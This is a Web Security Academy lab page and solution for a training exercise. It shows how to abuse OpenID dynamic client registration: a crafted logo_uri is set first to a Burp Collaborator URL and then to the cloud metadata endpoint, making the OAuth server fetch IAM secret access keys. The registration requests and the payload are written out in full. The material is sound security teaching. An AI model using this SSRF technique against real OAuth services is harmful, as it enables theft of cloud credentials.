# Lab: SSRF via OpenID dynamic client registration

Source: https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration
Fetched: 2026-06-28T09:17:57.865488+00:00

Web Security Academy

OAuth authentication

OpenID Connect

Lab

Lab: SSRF via OpenID dynamic client registration

This lab allows client applications to dynamically register themselves with the OAuth service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the OAuth service, which exposes a potential vector for SSRF.

To solve the lab, craft an SSRF attack to access http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/ and steal the secret access key for the OAuth provider's cloud environment.

You can log in to your own account using the following credentials: wiener:peter

Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

Solution

While proxying traffic through Burp, log in to your own account. Browse to https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration to access the configuration file. Notice that the client registration endpoint is located at /reg.

In Burp Repeater, create a suitable POST request to register your own client application with the OAuth service. You must at least provide a redirect_uris array containing an arbitrary whitelist of callback URIs for your fake application. For example:

POST /reg HTTP/1.1

Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net

Content-Type: application/json

{

"redirect_uris" : [

"https://example.com"

]

}

Send the request. Observe that you have now successfully registered your own client application without requiring any authentication. The response contains various metadata associated with your new client application, including a new client_id.

Using Burp, audit the OAuth flow and notice that the "Authorize" page, where the user consents to the requested permissions, displays the client application's logo. This is fetched from /client/CLIENT-ID/logo. We know from the OpenID specification that client applications can provide the URL for their logo using the logo_uri property during dynamic registration. Send the GET /client/CLIENT-ID/logo request to Burp Repeater.

In Repeater, go back to the POST /reg request that you created earlier. Add the logo_uri property. Right-click and select "Insert Collaborator payload" to paste a Collaborator URL as its value . The final request should look something like this:

POST /reg HTTP/1.1

Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net

Content-Type: application/json

{

"redirect_uris" : [

"https://example.com"

],

"logo_uri" : "https://BURP-COLLABORATOR-SUBDOMAIN"

}

Send the request to register a new client application and copy the client_id from the response.

In Repeater, go to the GET /client/CLIENT-ID/logo request. Replace the CLIENT-ID in the path with the new one you just copied and send the request.

Go to the Collaborator tab dialog and check for any new interactions. Notice that there is an HTTP interaction attempting to fetch your non-existent logo. This confirms that you can successfully use the logo_uri property to elicit requests from the OAuth server.

Go back to the POST /reg request in Repeater and replace the current logo_uri value with the target URL:

"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"

Send this request and copy the new client_id from the response.

Go back to the GET /client/CLIENT-ID/logo request and replace the client_id with the new one you just copied. Send this request. Observe that the response contains the sensitive metadata for the OAuth provider's cloud environment, including the secret access key.

Use the "Submit solution" button to submit the access key and solve the lab.

Community solutions

Michael Sommer

Find OAuth 2.0 authentication vulnerabilities using Burp Suite

Try for free
